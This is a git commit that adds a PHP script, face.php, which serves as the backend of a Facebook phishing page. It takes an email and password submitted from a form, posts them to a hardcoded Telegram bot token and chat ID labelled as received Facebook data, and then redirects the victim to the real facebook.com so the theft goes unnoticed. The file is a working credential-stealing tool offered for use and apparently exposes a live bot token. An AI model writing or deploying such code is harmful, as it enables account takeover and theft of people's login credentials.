41db7c9b64bb55c480070619854e7d2c5a9d0eb8
TESLA <93227377+rebootpy@users.noreply.github.com>
2022-06-12 18:55:24 -0500

    Add files via upload

---
+++ face.php
@@ -0,0 +1,40 @@
+<?php
+
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+date_default_timezone_set('America/Guatemala');
+
+$token = "5376029455:AAFZaNBOQgw6D0GfBaCxOsjfJNd1HPZOtgA";
+#digitales
+$dot = $_POST['para'];
+$dat = $_POST['poro'];
+
+$datos = [
+    'chat_id' => '1189170037',
+    #'chat_id' => '@el_canal si va dirigido a un canal',
+    'text' => "DATOS RECIBIDOS F-A-C-E-B-O-O-K \n\n🪙 Email $dot \n✅ Password: $dat  \n\nATTE: ReBoot",
+    'parse_mode' => 'HTML' #formato del mensaje
+];
+
+
+$ch = curl_init();
+
+curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage");
+curl_setopt($ch, CURLOPT_HEADER, false);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, TRUE);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $datos);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+$r_array = json_decode(curl_exec($ch), true);
+
+curl_close($ch);
+if ($r_array['ok'] == 1) {
+    header("Location: https://www.facebook.com/");
+} else {
+    echo "Mensaje no enviado.";
+    print_r($r_array);
+}
+?>
